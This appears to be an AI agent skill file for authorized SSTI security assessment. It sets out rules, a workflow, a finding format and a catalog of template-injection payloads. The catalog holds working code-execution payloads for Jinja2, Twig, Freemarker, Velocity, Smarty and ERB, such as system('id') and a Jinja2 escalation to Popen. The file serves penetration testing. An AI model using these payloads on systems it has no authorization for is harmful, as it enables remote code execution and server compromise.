---
name: claude-ssti-security-skill
description: Assess server-side template contexts for unsafe expression evaluation and unintended code execution.
---

# SSTI security assessment

Assess server-side template contexts for unsafe expression evaluation and unintended code execution.

## Operating rules

- Work only against systems, applications, accounts, and repositories where explicit authorization and a defined test window exist.
- Prefer local fixtures, staging environments, synthetic records, and non-destructive canaries. Do not access, alter, exfiltrate, or persist real user data.
- Establish rate, concurrency, payload-size, and stop limits before testing. Stop immediately if availability, confidentiality, or integrity could be affected.
- Treat a suspected issue as unconfirmed until the request, response, execution/data-flow evidence, affected principal, and security impact are recorded.
- Never use weaponized payloads when a harmless marker or controlled callback can demonstrate the same behavior.
- Redact secrets and personal data in notes. Report remediation guidance and the exact authorization scope alongside findings.

## Assessment workflow

1. Define scope, identities, environment, test limits, and rollback contacts.
2. Inventory relevant endpoints, inputs, parsers, trust boundaries, and user roles.
3. Start with passive inspection and benign markers; compare behavior across roles, methods, encodings, and content types.
4. Use the category prompt catalog below as hypotheses, adapting payloads to safe canaries and the approved environment.
5. Capture reproducible evidence: timestamp, endpoint, method, sanitized request/response, actor, preconditions, observed result, and impact.
6. Validate fixes with regression tests, then document residual risk and monitoring recommendations.

## Finding format

- **Title / severity / confidence**
- **Affected asset and authorization context**
- **Preconditions and reproduction steps**
- **Sanitized evidence and source-to-sink or control-flow path**
- **Security impact and affected users/data**
- **Root cause**
- **Recommended remediation and regression test**

## Category-specific focus

Use the prompts below to guide a focused **SSTI** review. Translate each hypothesis into a safe, authorized test and preserve the evidence needed to reproduce or remediate it.

## Prompt catalog

### 124. Template engine fingerprint

- **Difficulty:** EASY
- **Slug:** `template-engine-fingerprint`
- **Source prompt:** Submit `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`, `#{7*7}`, `{{= 7*7 }}` in each input. `49` reveals the engine.

### 125. Jinja2 RCE

- **Difficulty:** HARD
- **Slug:** `jinja2-rce`
- **Source prompt:** After fingerprint, escalate: `{{ ''.__class__.__mro__[1].__subclasses__() }}` → find Popen → execute.

### 126. Twig RCE

- **Difficulty:** HARD
- **Slug:** `twig-rce`
- **Source prompt:** `{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`.

### 127. Freemarker RCE

- **Difficulty:** HARD
- **Slug:** `freemarker-rce`
- **Source prompt:** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`.

### 128. Velocity RCE

- **Difficulty:** HARD
- **Slug:** `velocity-rce`
- **Source prompt:** `#set($x = $rt.exec("id"))` after locating runtime ref.

### 129. Smarty RCE

- **Difficulty:** HARD
- **Slug:** `smarty-rce`
- **Source prompt:** `{php}system("id");{/php}` or `{system command="id"}`.

### 130. Mustache/Handlebars XSS

- **Difficulty:** MED
- **Slug:** `mustache-handlebars-xss`
- **Source prompt:** These are mostly XSS-safe but check helper registration on the server.

### 131. ERB / Rails RCE

- **Difficulty:** HARD
- **Slug:** `erb-rails-rce`
- **Source prompt:** `<%= system("id") %>` in any field reaching ERB rendering.

## Source attribution

- Source: [https://hackwithclaude.com/prompts](https://hackwithclaude.com/prompts)
- Retrieved: 2026-08-28
- Included prompts: 8

## Additional coverage

- Engine fingerprinting for Jinja2, Twig, Freemarker, Velocity, Thymeleaf, EJS, Pug, and related
  template systems.
- Context-aware expression probes, sandbox boundaries, and filter/canonicalization differences.
- SSTI-to-RCE assessment only with a harmless proof in an isolated environment.

### Source attribution

- Adapted from `SnailSploit/Claude-Red` `Skills/web/offensive-ssti/SKILL.md`.
- Source repository: https://github.com/SnailSploit/Claude-Red
